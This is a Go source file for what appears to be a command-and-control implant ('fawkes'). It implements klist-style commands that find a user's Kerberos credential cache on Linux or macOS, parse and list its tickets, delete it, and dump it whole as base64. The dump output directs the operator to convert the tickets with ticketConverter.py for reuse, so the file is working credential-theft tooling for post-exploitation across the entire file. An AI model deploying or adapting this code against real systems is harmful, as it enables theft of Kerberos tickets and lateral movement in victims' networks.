//go:build linux || darwin
// +build linux darwin

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// ccachePrincipal represents a principal in the ccache file
type ccachePrincipal struct {
	NameType   uint32
	Realm      string
	Components []string
}

func (p ccachePrincipal) String() string {
	name := strings.Join(p.Components, "/")
	if p.Realm != "" {
		return name + "@" + p.Realm
	}
	return name
}

// ccacheCredential represents a credential entry in the ccache file
type ccacheCredential struct {
	Client       ccachePrincipal
	Server       ccachePrincipal
	KeyType      int32 // changed from uint16 to match ccache v4 spec
	AuthTime     time.Time
	StartTime    time.Time
	EndTime      time.Time
	RenewTill    time.Time
	IsSKey       bool
	TicketFlags  uint32
	TicketData   []byte
}

// findCcacheFile locates the Kerberos credential cache file
func findCcacheFile() string {
	// Check KRB5CCNAME environment variable first
	if ccname := os.Getenv("KRB5CCNAME"); ccname != "" {
		// Handle FILE: prefix
		if strings.HasPrefix(ccname, "FILE:") {
			return ccname[5:]
		}
		// Handle KEYRING: and other types
		if strings.Contains(ccname, ":") && !strings.HasPrefix(ccname, "/") {
			return "" // non-file ccache type
		}
		return ccname
	}
	// Default: /tmp/krb5cc_<uid>
	return fmt.Sprintf("/tmp/krb5cc_%d", os.Getuid())
}

// parseCcache reads and parses a ccache file
func parseCcache(path string) (*ccachePrincipal, []ccacheCredential, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, nil, err
	}
	defer f.Close()

	// Read version (2 bytes)
	var version uint16
	if err := binary.Read(f, binary.BigEndian, &version); err != nil {
		return nil, nil, fmt.Errorf("reading version: %v", err)
	}

	if version != 0x0504 && version != 0x0503 {
		return nil, nil, fmt.Errorf("unsupported ccache version: 0x%04X (expected 0x0503 or 0x0504)", version)
	}

	// For v4 (0x0504), skip header
	if version == 0x0504 {
		var headerLen uint16
		if err := binary.Read(f, binary.BigEndian, &headerLen); err != nil {
			return nil, nil, fmt.Errorf("reading header length: %v", err)
		}
		if headerLen > 0 {
			if _, err := io.CopyN(io.Discard, f, int64(headerLen)); err != nil {
				return nil, nil, fmt.Errorf("skipping header: %v", err)
			}
		}
	}

	// Read default principal
	defPrincipal, err := readCcachePrincipal(f)
	if err != nil {
		return nil, nil, fmt.Errorf("reading default principal: %v", err)
	}

	// Read credentials until EOF
	var creds []ccacheCredential
	for {
		cred, err := readCcacheCredential(f)
		if err == io.EOF || err == io.ErrUnexpectedEOF {
			break
		}
		if err != nil {
			break // stop on any parse error
		}
		creds = append(creds, *cred)
	}

	return defPrincipal, creds, nil
}

func readCcachePrincipal(r io.Reader) (*ccachePrincipal, error) {
	var p ccachePrincipal

	// Name type (4 bytes BE)
	if err := binary.Read(r, binary.BigEndian, &p.NameType); err != nil {
		return nil, err
	}

	// Number of components (4 bytes BE)
	var numComponents uint32
	if err := binary.Read(r, binary.BigEndian, &numComponents); err != nil {
		return nil, err
	}

	// Realm
	realm, err := readCcacheString(r)
	if err != nil {
		return nil, err
	}
	p.Realm = realm

	// Components
	for i := uint32(0); i < numComponents; i++ {
		comp, err := readCcacheString(r)
		if err != nil {
			return nil, err
		}
		p.Components = append(p.Components, comp)
	}

	return &p, nil
}

func readCcacheString(r io.Reader) (string, error) {
	var length uint32
	if err := binary.Read(r, binary.BigEndian, &length); err != nil {
		return "", err
	}
	if length > 65535 {
		return "", fmt.Errorf("string too long: %d", length)
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return "", err
	}
	return string(buf), nil
}

func readCcacheCredential(r io.Reader) (*ccacheCredential, error) {
	var cred ccacheCredential

	// Client principal
	client, err := readCcachePrincipal(r)
	if err != nil {
		return nil, err
	}
	cred.Client = *client

	// Server principal
	server, err := readCcachePrincipal(r)
	if err != nil {
		return nil, err
	}
	cred.Server = *server

	// Keyblock: keytype (2 bytes) + pad (2 bytes) + keylen (4 bytes? no...)
	// Actually in ccache v4: keytype (2 bytes), then data (counted_octet_string)
	// counted_octet_string = length (4 bytes BE) + data
	var keytype uint16
	if err := binary.Read(r, binary.BigEndian, &keytype); err != nil {
		return nil, err
	}
	cred.KeyType = int32(keytype)

	// Skip key data
	if err := skipCcacheOctetString(r); err != nil {
		return nil, fmt.Errorf("skipping keyblock: %v", err)
	}

	// Times: authtime, starttime, endtime, renew_till (each 4 bytes BE, unix seconds)
	var times [4]uint32
	for i := range times {
		if err := binary.Read(r, binary.BigEndian, &times[i]); err != nil {
			return nil, err
		}
	}
	cred.AuthTime = time.Unix(int64(times[0]), 0)
	cred.StartTime = time.Unix(int64(times[1]), 0)
	cred.EndTime = time.Unix(int64(times[2]), 0)
	cred.RenewTill = time.Unix(int64(times[3]), 0)

	// is_skey (1 byte)
	var isSKey uint8
	if err := binary.Read(r, binary.BigEndian, &isSKey); err != nil {
		return nil, err
	}
	cred.IsSKey = isSKey != 0

	// ticket_flags (4 bytes BE)
	if err := binary.Read(r, binary.BigEndian, &cred.TicketFlags); err != nil {
		return nil, err
	}

	// Addresses: num_address (4 bytes BE), then for each: addrtype (2) + data (counted_octet_string)
	var numAddresses uint32
	if err := binary.Read(r, binary.BigEndian, &numAddresses); err != nil {
		return nil, err
	}
	for i := uint32(0); i < numAddresses; i++ {
		var addrType uint16
		if err := binary.Read(r, binary.BigEndian, &addrType); err != nil {
			return nil, err
		}
		if err := skipCcacheOctetString(r); err != nil {
			return nil, err
		}
	}

	// Authdata: num_authdata (4 bytes BE), then for each: ad_type (2) + data (counted_octet_string)
	var numAuthdata uint32
	if err := binary.Read(r, binary.BigEndian, &numAuthdata); err != nil {
		return nil, err
	}
	for i := uint32(0); i < numAuthdata; i++ {
		var adType uint16
		if err := binary.Read(r, binary.BigEndian, &adType); err != nil {
			return nil, err
		}
		if err := skipCcacheOctetString(r); err != nil {
			return nil, err
		}
	}

	// Ticket data (counted_octet_string)
	ticketData, err := readCcacheOctetString(r)
	if err != nil {
		return nil, err
	}
	cred.TicketData = ticketData

	// Second ticket (counted_octet_string) — skip
	if err := skipCcacheOctetString(r); err != nil {
		return nil, err
	}

	return &cred, nil
}

func readCcacheOctetString(r io.Reader) ([]byte, error) {
	var length uint32
	if err := binary.Read(r, binary.BigEndian, &length); err != nil {
		return nil, err
	}
	if length > 1048576 { // 1MB sanity limit
		return nil, fmt.Errorf("octet string too long: %d", length)
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func skipCcacheOctetString(r io.Reader) error {
	var length uint32
	if err := binary.Read(r, binary.BigEndian, &length); err != nil {
		return err
	}
	if length > 1048576 {
		return fmt.Errorf("octet string too long: %d", length)
	}
	_, err := io.CopyN(io.Discard, r, int64(length))
	return err
}

func klistList(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return structs.CommandResult{
			Output:    "No file-based ccache found. KRB5CCNAME may use KEYRING or other non-file type.",
			Status:    "success",
			Completed: true,
		}
	}

	defPrincipal, creds, err := parseCcache(ccachePath)
	if err != nil {
		if os.IsNotExist(err) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("No ccache file found at %s\nNo Kerberos tickets cached for this user.", ccachePath),
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading ccache %s: %v", ccachePath, err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Kerberos Ticket Cache ===\n\nccache: %s\n", ccachePath))
	if defPrincipal != nil {
		sb.WriteString(fmt.Sprintf("Default principal: %s\n", defPrincipal.String()))
	}
	sb.WriteString(fmt.Sprintf("Cached tickets: %d\n", len(creds)))

	now := time.Now()
	displayed := 0

	for i, cred := range creds {
		// Apply server filter
		if args.Server != "" {
			filter := strings.ToLower(args.Server)
			serverStr := strings.ToLower(cred.Server.String())
			if !strings.Contains(serverStr, filter) {
				continue
			}
		}

		expired := ""
		if !cred.EndTime.IsZero() && cred.EndTime.Before(now) && cred.EndTime.Year() > 1970 {
			expired = " [EXPIRED]"
		}

		sb.WriteString(fmt.Sprintf("\n#%d  %s → %s%s\n",
			i, cred.Client.String(), cred.Server.String(), expired))
		sb.WriteString(fmt.Sprintf("    Encryption: %s (etype %d)\n",
			etypeToNameKL(cred.KeyType), cred.KeyType))
		sb.WriteString(fmt.Sprintf("    Flags:      %s (0x%08X)\n",
			klistFormatFlags(cred.TicketFlags), cred.TicketFlags))
		if cred.StartTime.Year() > 1970 {
			sb.WriteString(fmt.Sprintf("    Start:      %s\n", cred.StartTime.Format("2006-01-02 15:04:05")))
		}
		if cred.EndTime.Year() > 1970 {
			sb.WriteString(fmt.Sprintf("    End:        %s\n", cred.EndTime.Format("2006-01-02 15:04:05")))
		}
		if cred.RenewTill.Year() > 1970 {
			sb.WriteString(fmt.Sprintf("    Renew:      %s\n", cred.RenewTill.Format("2006-01-02 15:04:05")))
		}

		displayed++
	}

	if args.Server != "" && displayed != len(creds) {
		sb.WriteString(fmt.Sprintf("\nDisplayed %d/%d tickets (filter: %q)\n", displayed, len(creds), args.Server))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func klistPurge(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return structs.CommandResult{
			Output:    "No file-based ccache found to purge.",
			Status:    "success",
			Completed: true,
		}
	}

	if err := os.Remove(ccachePath); err != nil {
		if os.IsNotExist(err) {
			return structs.CommandResult{
				Output:    "No ccache file to purge (already clean).",
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error removing ccache %s: %v", ccachePath, err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Kerberos ccache purged: %s", ccachePath),
		Status:    "success",
		Completed: true,
	}
}

func klistDump(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return structs.CommandResult{
			Output:    "No file-based ccache found.",
			Status:    "error",
			Completed: true,
		}
	}

	data, err := os.ReadFile(ccachePath)
	if err != nil {
		if os.IsNotExist(err) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("No ccache file at %s", ccachePath),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading ccache: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	b64 := base64.StdEncoding.EncodeToString(data)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Dumped ccache %s (%d bytes)\n", ccachePath, len(data)))
	sb.WriteString("[+] Base64-encoded ccache (convert to kirbi with ticketConverter.py):\n\n")
	for i := 0; i < len(b64); i += 76 {
		end := i + 76
		if end > len(b64) {
			end = len(b64)
		}
		sb.WriteString(b64[i:end])
		sb.WriteString("\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}
